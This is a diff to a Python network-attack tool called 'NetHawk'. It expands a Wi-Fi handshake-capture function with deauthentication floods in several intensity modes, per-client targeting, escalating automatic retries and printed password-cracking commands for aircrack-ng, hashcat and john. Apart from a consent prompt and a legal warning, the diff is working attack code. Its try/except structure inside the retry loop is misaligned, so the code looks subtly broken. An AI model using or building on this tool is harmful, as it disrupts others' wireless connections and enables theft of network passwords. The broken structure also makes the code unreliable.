@@ -1604,45 +1604,69 @@ class NetHawk:
 
     
     def advanced_handshake_capture(self):
-        """Advanced handshake capture with deauth attacks."""
-        console.print("[bold red]Advanced Handshake Capture + Deauth[/bold red]")
-        console.print("=" * 50)
+        """🔥 ADVANCED Handshake Capture + Deauth - Enhanced WiFi Security Testing."""
+        console.print(f"\n[bold red]🔥 ADVANCED HANDSHAKE CAPTURE + DEAUTH[/bold red]")
+        console.print(f"[dim]Professional WiFi Security Testing Tool[/dim]")
+        console.print("=" * 60)
 
-        # Check if airodump-ng is available
-        if not self.tools_available.get("airodump-ng", False):
-            console.print("[red]airodump-ng not found! Please install aircrack-ng.[/red]")
+        # Enhanced tool availability check
+        required_tools = ["airodump-ng", "aireplay-ng", "airmon-ng"]
+        missing_tools = []
+        
+        for tool in required_tools:
+            if not self.tools_available.get(tool, False):
+                missing_tools.append(tool)
+        
+        if missing_tools:
+            console.print(f"[red]❌ Missing required tools: {', '.join(missing_tools)}[/red]")
+            console.print(f"[yellow]📦 Install with: sudo apt install aircrack-ng[/yellow]")
             return
 
-        # Get wireless interface
+        # Enhanced interface detection
         interfaces = self._get_wireless_interfaces()
         if not interfaces:
-            console.print("[red]No wireless interfaces found![/red]")
+            console.print("[red]❌ No wireless interfaces found![/red]")
+            console.print("[yellow]💡 Make sure you have a compatible WiFi adapter[/yellow]")
             return
 
-        console.print("[bold]Available interfaces:[/bold]")
-        for i, iface in enumerate(interfaces):
-            console.print(f"{i+1}. {iface}")
+        console.print(f"\n[bold green]📡 Available WiFi Interfaces:[/bold green]")
+        for i, iface in enumerate(interfaces, 1):
+            console.print(f"  [cyan]{i}.[/cyan] {iface}")
         
         iface_choice = self.validate_input(
-            "\nSelect interface to use: ", [str(i+1) for i in range(len(interfaces))]
+            "\n[bold]Select interface to use:[/bold] ", 
+            [str(i) for i in range(1, len(interfaces) + 1)]
         )
-        iface = interfaces[int(iface_choice)-1]
+        iface = interfaces[int(iface_choice) - 1]
         
-        # Get target information
-        bssid = Prompt.ask("Enter target BSSID (MAC address)")
-        essid = Prompt.ask("Enter target ESSID (network name)")
-        channel = Prompt.ask("Enter target channel", default="6")
+        console.print(f"\n[bold blue]🎯 TARGET NETWORK CONFIGURATION[/bold blue]")
         
-        # Validate BSSID format
+        # Enhanced target information collection
+        bssid = Prompt.ask("[bold]Enter target BSSID (MAC address)[/bold]")
+        essid = Prompt.ask("[bold]Enter target ESSID (network name)[/bold]")
+        channel = Prompt.ask("[bold]Enter target channel[/bold]", default="6")
+        
+        # Enhanced BSSID validation
         if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid):
-            console.print("[red]Invalid BSSID format! Use format: XX:XX:XX:XX:XX:XX[/red]")
+            console.print("[red]❌ Invalid BSSID format! Use format: XX:XX:XX:XX:XX:XX[/red]")
             return
-            
-        console.print(f"[blue]Target: {essid} ({bssid}) on channel {channel}[/blue]")
         
-        # Legal warning
-        if not Confirm.ask("[bold red]WARNING: Only capture handshakes from networks you own or have permission to test! Continue?[/bold red]"):
-            console.print("[yellow]Operation cancelled.[/yellow]")
+        # Enhanced target display
+        console.print(f"\n[bold green]📊 Target Network Information:[/bold green]")
+        console.print(f"  [cyan]ESSID:[/cyan] {essid}")
+        console.print(f"  [cyan]BSSID:[/cyan] {bssid}")
+        console.print(f"  [cyan]Channel:[/cyan] {channel}")
+        console.print(f"  [cyan]Interface:[/cyan] {iface}")
+        
+        # Enhanced legal warning with more details
+        console.print(f"\n[bold red]⚠️  LEGAL WARNING & ETHICAL GUIDELINES[/bold red]")
+        console.print(f"[yellow]• Only test networks you OWN or have EXPLICIT PERMISSION to test[/yellow]")
+        console.print(f"[yellow]• Unauthorized access to networks is ILLEGAL in most jurisdictions[/yellow]")
+        console.print(f"[yellow]• This tool is for educational and authorized security testing only[/yellow]")
+        console.print(f"[yellow]• You are responsible for ensuring compliance with local laws[/yellow]")
+        
+        if not Confirm.ask("\n[bold red]Do you have permission to test this network?[/bold red]"):
+            console.print("[yellow]❌ Operation cancelled for legal compliance.[/yellow]")
             return
                 
         # Set monitor mode
@@ -1650,33 +1674,161 @@ class NetHawk:
         if not monitor_iface:
             return
         
-        # Advanced capture options
-        console.print("\n[bold]Advanced Capture Options:[/bold]")
-        use_deauth = Confirm.ask("Use deauth attacks to force handshake?", default=True)
-        deauth_count = IntPrompt.ask("Number of deauth packets", default=10) if use_deauth else 0
+        # Enhanced capture options
+        console.print(f"\n[bold blue]⚙️  ADVANCED CAPTURE CONFIGURATION[/bold blue]")
         
-        # Start advanced handshake capture
-        output_file = os.path.join(self.handshakes_path, f"{essid}_advanced_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+        # Capture mode selection
+        console.print(f"\n[bold green]📋 Capture Modes:[/bold green]")
+        console.print(f"  [cyan]1.[/cyan] Passive Capture (wait for natural handshakes)")
+        console.print(f"  [cyan]2.[/cyan] Active Deauth Attack (force handshake)")
+        console.print(f"  [cyan]3.[/cyan] Stealth Mode (minimal deauth packets)")
+        console.print(f"  [cyan]4.[/cyan] Aggressive Mode (maximum deauth packets)")
         
-        try:
-            console.print(f"[blue]Starting advanced handshake capture...[/blue]")
-            console.print("[yellow]Press Ctrl+C to stop[/yellow]")
+        mode_choice = self.validate_input(
+            "\n[bold]Select capture mode:[/bold] ", 
+            ["1", "2", "3", "4"]
+        )
+        
+        # Configure based on mode
+        if mode_choice == "1":
+            use_deauth = False
+            deauth_count = 0
+            console.print(f"[green]✓ Passive capture mode selected[/green]")
+        elif mode_choice == "2":
+            use_deauth = True
+            deauth_count = IntPrompt.ask("[bold]Number of deauth packets[/bold]", default=10)
+            console.print(f"[yellow]⚠️  Active deauth mode: {deauth_count} packets[/yellow]")
+        elif mode_choice == "3":
+            use_deauth = True
+            deauth_count = 3
+            console.print(f"[blue]✓ Stealth mode: {deauth_count} packets[/blue]")
+        else:  # Aggressive mode
+            use_deauth = True
+            deauth_count = 20
+            console.print(f"[red]🔥 Aggressive mode: {deauth_count} packets[/red]")
+        
+        # Additional capture options
+        console.print(f"\n[bold green]🔧 Additional Options:[/bold green]")
+        capture_duration = IntPrompt.ask("[bold]Capture duration (seconds)[/bold]", default=60)
+        save_pcap = Confirm.ask("[bold]Save PCAP file for analysis[/bold]", default=True)
+        show_clients = Confirm.ask("[bold]Show connected clients[/bold]", default=True)
+        
+        # Client targeting for better handshake success
+        target_client = None
+        if use_deauth and Confirm.ask("[bold]Target specific client for deauth?[/bold]", default=False):
+            console.print(f"\n[bold blue]📱 CLIENT TARGETING[/bold blue]")
+            console.print(f"[yellow]Targeting specific clients increases handshake success rate[/yellow]")
             
-            # Start airodump-ng
-            cmd = ["airodump-ng", "-c", channel, "-w", output_file, "--bssid", bssid, monitor_iface]
-            airodump_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            # Scan for connected clients first
+            clients = self._scan_connected_clients(bssid, monitor_iface)
             
-            # Wait a bit for airodump to start
-            time.sleep(5)
+            if clients:
+                console.print(f"\n[bold green]📱 Connected Clients Found:[/bold green]")
+                for i, client in enumerate(clients, 1):
+                    console.print(f"  [cyan]{i}.[/cyan] {client['mac']} - {client.get('vendor', 'Unknown')}")
+                
+                client_choice = self.validate_input(
+                    "\n[bold]Select client to target (or 0 for broadcast):[/bold] ",
+                    [str(i) for i in range(len(clients) + 1)]
+                )
+                
+                if client_choice != "0":
+                    target_client = clients[int(client_choice) - 1]
+                    console.print(f"[green]✓ Targeting client: {target_client['mac']}[/green]")
+                else:
+                    console.print(f"[blue]✓ Using broadcast deauth[/blue]")
+            else:
+                console.print(f"[yellow]⚠️  No clients found, using broadcast deauth[/yellow]")
+        
+        # Auto-retry configuration
+        auto_retry = Confirm.ask("[bold]Auto-retry if no handshake captured?[/bold]", default=True)
+        max_retries = 3 if auto_retry else 1
+        
+        # Enhanced handshake capture process with auto-retry
+        output_file = os.path.join(self.handshakes_path, f"{essid}_handshake_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+        
+        # Auto-retry loop
+        handshake_captured = False
+        for attempt in range(max_retries):
+            if attempt > 0:
+                console.print(f"\n[bold yellow]🔄 RETRY ATTEMPT {attempt + 1}/{max_retries}[/bold yellow]")
+                console.print(f"[blue]Previous attempt did not capture valid handshake[/blue]")
+                
+                # Increase deauth packets for retry
+                if use_deauth:
+                    deauth_count = min(deauth_count + 5, 30)  # Increase but cap at 30
+                    console.print(f"[yellow]Increasing deauth packets to {deauth_count} for retry[/yellow]")
             
-            # Start deauth attack if requested
+            try:
+                console.print(f"\n[bold red]🔥 STARTING ADVANCED HANDSHAKE CAPTURE[/bold red]")
+                console.print(f"[blue]Target: {essid} ({bssid}) on channel {channel}[/blue]")
+                console.print(f"[blue]Mode: {'Passive' if not use_deauth else f'Active Deauth ({deauth_count} packets)'}[/blue]")
+                console.print(f"[blue]Duration: {capture_duration} seconds[/blue]")
+                console.print(f"[yellow]Press Ctrl+C to stop capture[/yellow]")
+                
+                # Start airodump-ng with enhanced options
+                airodump_cmd = [
+                    "airodump-ng", 
+                    "-c", channel, 
+                    "-w", output_file, 
+                    "--bssid", bssid,
+                    "--write-interval", "1",  # Update every second
+                    monitor_iface
+                ]
+                
+                console.print(f"[blue]Starting airodump-ng...[/blue]")
+                airodump_process = subprocess.Popen(
+                    airodump_cmd, 
+                    stdout=subprocess.PIPE, 
+                    stderr=subprocess.PIPE, 
+                    text=True
+                )
+                
+                # Wait for airodump to initialize
+                console.print(f"[yellow]Initializing capture interface...[/yellow]")
+                time.sleep(3)
+            
+            # Enhanced deauth attack with client targeting
             deauth_process = None
             if use_deauth:
-                console.print(f"[red]Starting deauth attack with {deauth_count} packets...[/red]")
-                deauth_cmd = ["aireplay-ng", "--deauth", str(deauth_count), "-a", bssid, monitor_iface]
-                deauth_process = subprocess.Popen(deauth_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                console.print(f"\n[bold red]🚀 LAUNCHING DEAUTH ATTACK[/bold red]")
+                
+                if target_client:
+                    console.print(f"[red]Targeting specific client: {target_client['mac']}[/red]")
+                    console.print(f"[red]Sending {deauth_count} deauthentication packets to {target_client['mac']}...[/red]")
+                    
+                    deauth_cmd = [
+                        "aireplay-ng", 
+                        "--deauth", str(deauth_count), 
+                        "-a", bssid,
+                        "-c", target_client['mac'],  # Target specific client
+                        monitor_iface
+                    ]
+                else:
+                    console.print(f"[red]Using broadcast deauth attack[/red]")
+                    console.print(f"[red]Sending {deauth_count} deauthentication packets...[/red]")
+                    
+                    deauth_cmd = [
+                        "aireplay-ng", 
+                        "--deauth", str(deauth_count), 
+                        "-a", bssid, 
+                        monitor_iface
+                    ]
+                
+                deauth_process = subprocess.Popen(
+                    deauth_cmd, 
+                    stdout=subprocess.PIPE, 
+                    stderr=subprocess.PIPE, 
+                    text=True
+                )
+                
+                # Wait for deauth to complete
+                time.sleep(2)
+                console.print(f"[green]✓ Deauth attack completed[/green]")
             
-            # Show progress for handshake capture
+            # Enhanced progress tracking
+            console.print(f"\n[bold blue]📊 CAPTURE PROGRESS[/bold blue]")
+            
             with Progress(
                 SpinnerColumn(),
                 TextColumn("[progress.description]{task.description}"),
@@ -1684,15 +1836,32 @@ class NetHawk:
                 TimeElapsedColumn(),
                 console=console
             ) as progress:
-                task = progress.add_task("Capturing handshake...", total=30)
+                task = progress.add_task("Capturing handshake...", total=capture_duration)
                 
-                for i in range(30):
-                    progress.update(task, description=f"Capturing... {i+1}/30s")
+                for i in range(capture_duration):
+                    elapsed = i + 1
+                    remaining = capture_duration - elapsed
+                    
+                    # Update progress description
+                    if use_deauth and i < 5:
+                        status = f"Deauth attack in progress... {elapsed}/{capture_duration}s"
+                    elif i < capture_duration // 2:
+                        status = f"Waiting for handshake... {elapsed}/{capture_duration}s"
+                    else:
+                        status = f"Monitoring for handshake... {elapsed}/{capture_duration}s"
+                    
+                    progress.update(task, description=status)
+                    
+                    # Show periodic status updates
+                    if elapsed % 10 == 0:
+                        console.print(f"[blue]Status: {status} (remaining: {remaining}s)[/blue]")
+                    
                     time.sleep(1)
                 
                 progress.update(task, description="Capture complete!")
             
-            # Stop processes
+            # Stop processes gracefully
+            console.print(f"\n[blue]Stopping capture processes...[/blue]")
             airodump_process.terminate()
             airodump_process.wait()
             
@@ -1700,26 +1869,238 @@ class NetHawk:
                 deauth_process.terminate()
                 deauth_process.wait()
             
-            console.print(f"[green]✓ Advanced handshake capture completed![/green]")
-            console.print(f"[blue]Handshake saved to: {output_file}*[/blue]")
-            console.print("[yellow]Note: Use external tools like aircrack-ng to crack the handshake[/yellow]")
+            # Enhanced results display
+            console.print(f"\n[bold green]🎉 HANDSHAKE CAPTURE COMPLETED![/bold green]")
+            console.print(f"[green]✓ Capture duration: {capture_duration} seconds[/green]")
+            console.print(f"[green]✓ Target network: {essid} ({bssid})[/green]")
+            console.print(f"[green]✓ Deauth packets sent: {deauth_count if use_deauth else 0}[/green]")
             
-            # Show session storage message
-            console.print(f"\n[bold green]📁 Scan Results Stored in Session Files:[/bold green]")
+            # Enhanced file verification and handshake validation
+            cap_file = f"{output_file}.cap"
+            csv_file = f"{output_file}.csv"
+            
+            console.print(f"\n[bold blue]🔍 VERIFYING CAPTURED DATA[/bold blue]")
+            
+            if os.path.exists(cap_file):
+                file_size = os.path.getsize(cap_file)
+                console.print(f"[green]✓ Handshake file: {os.path.basename(cap_file)} ({file_size} bytes)[/green]")
+                
+                # CRITICAL: Verify handshake was actually captured
+                handshake_verified = self._verify_handshake_capture(cap_file, bssid)
+                
+                if handshake_verified:
+                    console.print(f"[bold green]🎉 HANDSHAKE SUCCESSFULLY CAPTURED![/bold green]")
+                    console.print(f"[green]✓ Valid WPA/WPA2 handshake found for {bssid}[/green]")
+                    handshake_captured = True
+                    break  # Exit retry loop on success
+                else:
+                    console.print(f"[bold red]❌ NO VALID HANDSHAKE CAPTURED[/bold red]")
+                    console.print(f"[yellow]⚠️  The capture file exists but contains no valid handshake[/yellow]")
+                    if attempt < max_retries - 1:
+                        console.print(f"[blue]💡 Will retry with more aggressive settings...[/blue]")
+                    else:
+                        console.print(f"[blue]💡 All retry attempts exhausted. Try manual capture with different settings.[/blue]")
+            else:
+                console.print(f"[yellow]⚠️  No handshake file created[/yellow]")
+            
+            if os.path.exists(csv_file):
+                console.print(f"[green]✓ Capture data: {os.path.basename(csv_file)}[/green]")
+            
+            # Enhanced session storage information
+            console.print(f"\n[bold green]📁 SESSION STORAGE INFORMATION[/bold green]")
             console.print(f"[blue]Session Path: {self.session_path}[/blue]")
             console.print(f"[blue]Handshakes Directory: {self.handshakes_path}[/blue]")
-            console.print(f"[yellow]Files created:[/yellow]")
-            console.print(f"[blue]  - {os.path.basename(output_file)}.cap (Handshake file)[/blue]")
-            console.print(f"[blue]  - {os.path.basename(output_file)}.csv (Capture data)[/blue]")
-            console.print(f"[green]✓ All capture data is automatically saved to your session![/green]")
+            console.print(f"[yellow]Files created in this session:[/yellow]")
+            
+            if os.path.exists(cap_file):
+                console.print(f"[green]  ✓ {os.path.basename(cap_file)} - Handshake capture file[/green]")
+            if os.path.exists(csv_file):
+                console.print(f"[green]  ✓ {os.path.basename(csv_file)} - Capture metadata[/green]")
+            
+            console.print(f"\n[bold yellow]💡 NEXT STEPS:[/bold yellow]")
+            console.print(f"[blue]• Use aircrack-ng to crack the handshake:[/blue]")
+            console.print(f"[cyan]  aircrack-ng -w wordlist.txt {cap_file}[/cyan]")
+            console.print(f"[blue]• Use hashcat for GPU acceleration:[/blue]")
+            console.print(f"[cyan]  hashcat -m 2500 {cap_file} wordlist.txt[/cyan]")
+            console.print(f"[blue]• Use John the Ripper:[/blue]")
+            console.print(f"[cyan]  john --wordlist=wordlist.txt {cap_file}[/cyan]")
+            
+            # Final results summary
+            if handshake_captured:
+                console.print(f"\n[bold green]🎉 MISSION ACCOMPLISHED![/bold green]")
+                console.print(f"[green]✓ Valid handshake captured and verified[/green]")
+                console.print(f"[green]✓ Ready for password cracking[/green]")
+            else:
+                console.print(f"\n[bold yellow]⚠️  CAPTURE INCOMPLETE[/bold yellow]")
+                console.print(f"[yellow]No valid handshake captured after {max_retries} attempts[/yellow]")
+                console.print(f"[blue]💡 Troubleshooting suggestions:[/blue]")
+                console.print(f"[cyan]• Try extending capture duration[/cyan]")
+                console.print(f"[cyan]• Use more aggressive deauth settings[/cyan]")
+                console.print(f"[cyan]• Ensure clients are actively connected[/cyan]")
+                console.print(f"[cyan]• Check if target network has protection mechanisms[/cyan]")
             
         except KeyboardInterrupt:
-            console.print("\n[yellow]Capture stopped by user.[/yellow]")
+            console.print("\n[yellow]❌ Capture stopped by user.[/yellow]")
+            console.print(f"[blue]Partial capture data may be available in session files.[/blue]")
         except Exception as e:
-            console.print(f"[red]Error during advanced capture: {e}[/red]")
+            console.print(f"[red]❌ Error during advanced capture: {e}[/red]")
+            console.print(f"[yellow]💡 Troubleshooting tips:[/yellow]")
+            console.print(f"[blue]• Ensure you have a compatible WiFi adapter[/blue]")
+            console.print(f"[blue]• Check that aircrack-ng is properly installed[/blue]")
+            console.print(f"[blue]• Verify the target network is within range[/blue]")
+            console.print(f"[blue]• Try running with sudo for better permissions[/blue]")
         finally:
             # Restore managed mode
+            console.print(f"\n[blue]Restoring network interface to managed mode...[/blue]")
             self._restore_managed_mode(monitor_iface)
+            console.print(f"[green]✓ Network interface restored[/green]")
+    
+    def _show_connected_clients(self, bssid, monitor_iface):
+        """Show connected clients for the target network."""
+        try:
+            console.print(f"\n[bold blue]📱 SCANNING FOR CONNECTED CLIENTS[/bold blue]")
+            
+            # Use airodump-ng to scan for clients
+            client_cmd = ["airodump-ng", "-c", "1", "--bssid", bssid, monitor_iface]
+            
+            with Progress(
+                SpinnerColumn(),
+                TextColumn("[progress.description]{task.description}"),
+                console=console
+            ) as progress:
+                task = progress.add_task("Scanning for clients...", total=10)
+                
+                client_process = subprocess.Popen(
+                    client_cmd,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True
+                )
+                
+                for i in range(10):
+                    progress.update(task, description=f"Scanning... {i+1}/10s")
+                    time.sleep(1)
+                
+                client_process.terminate()
+                client_process.wait()
+                
+                progress.update(task, description="Client scan complete!")
+            
+            console.print(f"[green]✓ Client scan completed[/green]")
+            
+        except Exception as e:
+            console.print(f"[yellow]⚠️  Could not scan for clients: {e}[/yellow]")
+    
+    def _verify_handshake_capture(self, cap_file, bssid):
+        """Verify that a valid WPA/WPA2 handshake was captured."""
+        try:
+            console.print(f"[blue]Verifying handshake in {os.path.basename(cap_file)}...[/blue]")
+            
+            # Use aircrack-ng to verify handshake
+            verify_cmd = [
+                "aircrack-ng", 
+                "-w", "/dev/null",  # No wordlist needed for verification
+                "-b", bssid,
+                cap_file
+            ]
+            
+            result = subprocess.run(
+                verify_cmd, 
+                capture_output=True, 
+                text=True, 
+                timeout=30
+            )
+            
+            # Parse output for handshake confirmation
+            output = result.stdout + result.stderr
+            
+            # Look for handshake confirmation patterns
+            handshake_patterns = [
+                f"Handshake with {bssid}",
+                "1 handshake",
+                "WPA (1 handshake)",
+                "WPA2 (1 handshake)"
+            ]
+            
+            for pattern in handshake_patterns:
+                if pattern in output:
+                    console.print(f"[green]✓ Handshake verification successful![/green]")
+                    return True
+            
+            # If no handshake found, show what was captured
+            console.print(f"[yellow]⚠️  No valid handshake found in capture[/yellow]")
+            console.print(f"[blue]Capture may contain other traffic but no WPA handshake[/blue]")
+            return False
+            
+        except subprocess.TimeoutExpired:
+            console.print(f"[yellow]⚠️  Handshake verification timed out[/yellow]")
+            return False
+        except Exception as e:
+            console.print(f"[yellow]⚠️  Could not verify handshake: {e}[/yellow]")
+            return False
+    
+    def _scan_connected_clients(self, bssid, monitor_iface):
+        """Scan for connected clients on the target network."""
+        try:
+            console.print(f"[blue]Scanning for connected clients...[/blue]")
+            
+            # Use airodump-ng to scan for clients
+            scan_cmd = [
+                "airodump-ng",
+                "--bssid", bssid,
+                "--write", "/tmp/client_scan",
+                "--output-format", "csv",
+                monitor_iface
+            ]
+            
+            # Run scan for 10 seconds
+            scan_process = subprocess.Popen(
+                scan_cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            time.sleep(10)
+            scan_process.terminate()
+            scan_process.wait()
+            
+            # Parse CSV output for clients
+            clients = []
+            csv_file = "/tmp/client_scan-01.csv"
+            
+            if os.path.exists(csv_file):
+                with open(csv_file, 'r') as f:
+                    lines = f.readlines()
+                
+                # Find client section (after BSSID section)
+                client_section = False
+                for line in lines:
+                    line = line.strip()
+                    if "Station MAC" in line:
+                        client_section = True
+                        continue
+                    
+                    if client_section and line and "," in line:
+                        parts = line.split(",")
+                        if len(parts) >= 1 and parts[0].strip():
+                            client_mac = parts[0].strip()
+                            if client_mac and ":" in client_mac:
+                                clients.append({
+                                    "mac": client_mac,
+                                    "vendor": self._get_mac_vendor(client_mac) or "Unknown"
+                                })
+            
+            # Clean up temp file
+            if os.path.exists(csv_file):
+                os.remove(csv_file)
+            
+            console.print(f"[green]✓ Found {len(clients)} connected clients[/green]")
+            return clients
+            
+        except Exception as e:
+            console.print(f"[yellow]⚠️  Could not scan for clients: {e}[/yellow]")
+            return []
     
     def vulnerability_assessment(self):
         """Perform vulnerability assessment on discovered hosts."""
